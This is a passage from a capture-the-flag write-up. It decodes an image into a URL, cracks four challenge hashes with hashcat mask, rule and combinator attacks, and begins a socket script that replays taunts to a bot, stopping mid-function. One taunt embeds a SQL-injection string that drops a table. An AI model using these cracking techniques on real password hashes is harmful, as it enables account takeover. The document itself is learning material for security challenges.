&lt;p&gt;I am told that &lt;code&gt;blue&lt;/code&gt; is &lt;code&gt;110&lt;/code&gt;. I took a guess that therefore red will be &lt;code&gt;011&lt;/code&gt; and
green &lt;code&gt;101&lt;/code&gt;. Basically the binary represents the RGB values inverted. Applying this
I wrote a script to translate the colours to a binary string and then conver that to ASCII
which gave me the egg&amp;rsquo;s URL.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#!/bin/env python&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;PIL&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Image&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;codes&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;111&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;110&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;101&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;100&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;011&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;010&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;001&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;000&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Image&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;conycode.png&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;14.0&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;pixels&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;list(im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;getdata())&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pixels[im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]]&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;pixels[im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)]&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;[]&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;xrange(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;w&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;xrange(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;output&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;append(codes[pixels[w&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(im&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;size[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h)]])&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;bin_string&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(output)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(bin_string)&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;xrange(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(bin_string),&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;t&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;int(bin_string[x:x&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ba&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;bytearray([t])&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;stdout&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;write(str(ba))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id=&#34;challenge-22:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 22&lt;/h1&gt;

&lt;p&gt;Hash cracking. I am new to this, but boy did I enjoy this challenge because I learned
a lot! I decided to use &lt;a href=&#34;https://hashcat.net/oclhashcat/&#34;&gt;hashcat&lt;/a&gt; for all the hashes.&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s begin:&lt;/p&gt;

&lt;h2 id=&#34;hash-1:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 1&lt;/h2&gt;

&lt;p&gt;A 16 digit pin takes a long time to bruteforce, but the hint tells me that the only
numbers in the PIN are 1, 7, 9, and 0.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;hashcat -m100 -1 1790 --pw-min=16 --pw-max=16 -a3 hash1.txt ?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;time taken: 4:40 minutes&lt;/p&gt;

&lt;h2 id=&#34;hash-2:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 2&lt;/h2&gt;

&lt;p&gt;This one had me stumped for ages, because it was hard to bruteforce and hashcat didn&amp;rsquo;t support
sha384. Luckily I found &lt;a href=&#34;https://crackstation.net/&#34;&gt;Crackstation&lt;/a&gt; where I entered the hash
and was immediately rewarded with the correct answer. Alternatively writing a brute forcer in Python
and using the Rockyou wordlist would also have worked.&lt;/p&gt;

&lt;h2 id=&#34;hash-3:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 3&lt;/h2&gt;

&lt;p&gt;Here I employed hashcat&amp;rsquo;s &lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=rule_based_attack&#34;&gt;rule based attacks&lt;/a&gt;
 to make myself a new wordlist based on the given rules.
First I needed to run the &lt;code&gt;toggle&lt;/code&gt; rule to generate the words with one upper case char.
Then I ran a the substituion rule (which is the &lt;code&gt;leetspeak.rule&lt;/code&gt;). Now I had a
list of words that had one substitution and one upper case letter. Only the
punctuation and digit missing now. For this step I wrote a python script
that would generate the required rule table:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;puncs&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;! @ # $ % ^ &amp;amp; * ( ) _ + { } [ ] : ; . , / ? ~ `&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;split()&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;nums&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;1 2 3 4 5 6 7 8 9 0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;split()&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;pn.rule&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;punc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;puncs:&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;nums:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;write(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;$%s$%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(punc,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;n))&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;write(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;$%s$%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(n,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;punc))&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;fh&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I then used this rule to run it over the word list, then&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;hashcat -m0 hash3.txt final.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;to get the plaintext in 3 seconds.&lt;/p&gt;

&lt;h2 id=&#34;hash-4:00aa8d5840836b6803fb0a2203b66750&#34;&gt;hash 4&lt;/h2&gt;

&lt;p&gt;Here I needed to run hashcat&amp;rsquo;s combinator attack a few times on the word list.
What this does is append each word of a wordlist to every other word.
Running this a few times will give me the list I need:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;hashcat -a1 wordlist.txt --stdout &amp;gt; pass1.txt
hashcat -a1 -m1400 hash4.txt pass1.txt
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Scoop the plaintext in 8 minutes.&lt;/p&gt;

&lt;h1 id=&#34;challenge-23:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 23&lt;/h1&gt;

&lt;p&gt;Once connected to the server I have to insult the bot quickly and smartly. But who is
smarter than the bot? No one that&amp;rsquo;s who. Except perhaps the bot itself. In essence
what needs to be done is get the taunts from the master and play them back
to him. Then use his replies as respsonses to his taunts.&lt;/p&gt;

&lt;p&gt;I figure there&amp;rsquo;s two ways of doing this;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1. Connect the bot to itself via a client that relays the messages between the two
2. Record the quips and play them back automatically as needed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I plumped for option 2 and hoped there wouldn&amp;rsquo;t be too many quips to harvest. Having
played against the bot a few times I managed to get myself the list of comebacks and
wrote a Python script to pwn the Nerd Master&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;random&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;


&lt;span style=&#34;color: #f8f8f2&#34;&gt;challs&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Pna lbh ernq guvf?&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;EBG13 vf sbe ynzref.&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You&amp;#39;re so slow, you must have been written in BASIC.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;At least I don&amp;#39;t have memory leaks like you.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Go 127.0.0.1 to your mummy.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;go 127.0.0.1 to your mom&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I have more friends than you.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Yeah, but only until you update your Facebook profile with a real picture of you!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You should leave your cave and socialize a bit.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I&amp;#39;m not anti-social. I&amp;#39;m just not user friendly.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;This fight is like a hash function - it works in one direction only.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Too bad you picked LM hashing.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I bet you don&amp;#39;t even understand binary.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Sure I do. Me and you, we are 10 different kind of persons.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;1f u c4n r34d th1s u r s70p1d.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You better check your spelling. Stoopid has two &amp;#39;o&amp;#39;s.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;After loosing to me, your life won&amp;#39;t be the same anymore.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;A Life? Cool! Where can I download one of those?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You&amp;#39;ll be 0xdeadbeef soon.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Not as long as I have my 0xcafebabe.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Af7ter th1s f1gh7, I w1ll pwn ur b0x3n.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Check your settings - you seem to have chosen the Klingon keyboard layout.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I have more friends than you.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Yeah, but only until you update your Facebook profile with a real picture of you!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;I&amp;#39;ll check you out - any last words?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;svn:ignore&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Tell me your name, hobo. I need to check your records.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;My name is bob&amp;#39;; DROP TABLE VALJ;--&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;format C:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Specified drive does not exist.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You must be jealous when seeing my phone&amp;#39;s display.&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Not really - Your pixels are so big, some of them have their own region code!&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;
          &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Ping! Anybody there?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;ICMP type 3, code 13: Communication Administratively Prohibited&amp;quot;&lt;/span&gt;
          &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;challs&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;removekey&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(d,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;key):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;dict(d)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;del&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r[key]&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;r&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;sendchall&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(s,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chall):&lt;/span&gt;
